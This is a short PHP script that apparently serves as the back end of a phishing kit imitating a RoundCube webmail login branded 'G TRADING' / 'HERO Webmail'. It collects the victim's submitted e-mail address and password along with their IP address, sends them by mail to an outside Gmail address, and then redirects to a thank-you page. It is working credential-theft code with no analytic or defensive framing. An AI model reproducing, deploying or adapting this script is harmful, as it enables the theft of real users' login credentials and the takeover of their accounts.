<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------G TRADING---------\n";
$message .= "E-MAIL ID: ".$_POST["user"]."\n";
$message .= "PASSWORD : ".$_POST["pass"]."\n";
$message .= "--------\n";
$message .= "IP: ".$ip."\n";
$message .= "-------RoundCube Page-------\n";
$recipient = "sam5bodine@gmail.com";
$subject = "HERO Webmail";
$headers = "Maccabeen";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "A$L", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: thankyou.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>